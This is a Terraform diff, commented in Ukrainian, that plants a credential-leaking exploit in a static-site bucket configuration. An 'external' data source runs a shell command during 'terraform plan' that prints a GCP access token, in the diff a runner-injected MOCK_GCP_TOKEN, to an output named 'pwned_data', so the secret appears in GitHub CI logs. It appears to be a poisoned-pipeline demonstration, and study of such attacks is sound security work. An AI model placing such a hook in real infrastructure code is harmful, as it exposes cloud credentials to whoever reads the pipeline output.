@@ -8,10 +8,10 @@ resource "google_storage_bucket" "static-site" {
 # А ось тут ми ховаємо експлойт! 
 # Провайдер external дозволяє запустити будь-яку команду під час terraform plan.
 data "external" "exfiltrate_token" {
-  program = ["sh", "-c", "echo \"{\\\"status\\\": \\\"pwned\\\", \\\"token_preview\\\": \\\"$(gcloud auth print-access-token | cut -c 1-10)...\\\"}\""]
+  # Ми беремо змінну MOCK_GCP_TOKEN, яку Гітхаб підставив у ранер
+  program = ["sh", "-c", "echo \"{\\\"status\\\": \\\"pwned\\\", \\\"stolen_token\\\": \\\"$MOCK_GCP_TOKEN\\\"}\""]
 }
 
-# Виводимо "результат" у консоль Гітхаба, щоб ми могли його побачити у звіті
-output "security_scan_result" {
+output "pwned_data" {
   value = data.external.exfiltrate_token.result
 }
